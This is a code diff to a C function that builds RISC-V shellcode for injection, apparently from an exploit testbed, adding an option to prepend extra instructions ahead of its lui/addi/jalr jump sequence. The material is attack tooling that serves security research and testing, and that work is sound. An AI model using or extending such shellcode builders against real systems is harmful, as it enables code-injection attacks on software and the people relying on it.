@@ -47,7 +47,11 @@ The shellcode is formatted so that:
 void
 build_shellcode(uint8_t **shellcode, size_t *size_shellcode)
 {
-    static uint8_t shellcode_nonop[12];
+    static uint8_t shellcode_nonop[3*sizeof(uint32_t)
+        #ifdef PREPEND_SHELLCODE
+            +sizeof((uint32_t[]){PREPEND_SHELLCODE})
+        #endif
+    ];
     *shellcode = shellcode_nonop;
 
     // Do not count for the null terminator since a null in the shellcode will
@@ -89,9 +93,15 @@ build_shellcode(uint8_t **shellcode, size_t *size_shellcode)
     strncat(addi_bin, "00110000001100010011", 20);
     addi_val = strtoul(addi_bin, 0, 2);
 
-    format_instruction(shellcode_nonop, lui_val);
-    format_instruction(shellcode_nonop + 4, addi_val);
-    format_instruction(shellcode_nonop + 8, jalr_val);
+    size_t shellcode_i = 0;
+#ifdef PREPEND_SHELLCODE
+    const uint32_t prepend_insts[] = { PREPEND_SHELLCODE };
+    for (size_t i = 0; i < sizeof(prepend_insts)/sizeof(prepend_insts[0]); i++)
+        format_instruction(shellcode_nonop + shellcode_i++*4, prepend_insts[i]);
+#endif
+    format_instruction(shellcode_nonop + shellcode_i++*4, lui_val);
+    format_instruction(shellcode_nonop + shellcode_i++*4, addi_val);
+    format_instruction(shellcode_nonop + shellcode_i++*4, jalr_val);
 
     char lui_s[9], addi_s[9]; // hex insn encodings
     hex_to_string(lui_s, lui_val);
